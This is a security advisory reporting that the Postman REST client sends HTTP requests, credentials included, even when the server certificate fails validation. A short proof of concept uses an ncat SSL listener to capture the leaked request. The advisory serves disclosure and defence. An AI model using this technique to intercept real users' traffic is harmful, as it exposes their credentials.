~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

Postman is a feature-rich REST client.

The manufacturer describes the product as follows (see [1]):

"Postman is the most complete toolchain for API development
* The most-used REST client worldwide
* Designed from the ground up to support the API developer
* Intuitive user interface to send requests, save responses, add tests,
and create workflows"

Due to improper certificate validation, Postman is vulnerable to
man-in-the-middle attacks.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

certificate is not valid. Unfortunately, the HTTP request is sent
anyway. Only the response is not displayed. Thus, all contained
information of the HTTP request is disclosed, for example user
credentials.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

1. Open ncat SSL listener: ncat --ssl -l 8888 -k
2. Send GET request to URL in Postman: https://10.0.0.2:8888/postmanssl
3. Get error in Postman:

"Could not get any response
There was an error connecting to https://10.0.0.2:8888/postmanssl.

Why this might have happened:
The server couldn't send a response:
Ensure that the backend is working properly
Self-signed SSL certificates are being blocked:
Fix this by turning off 'SSL certificate verification' in Settings > General
Proxy configured incorrectly
Ensure that proxy is configured correctly in Settings > Proxy
Request timeout:
Change request timeout in Settings > General"

4. See HTTP GET request via ncat anyway:

GET /postmanssl HTTP/1.1
cache-control: no-cache
Postman-Token: 606e036d-9b05-449d-9347-c511ef322d28
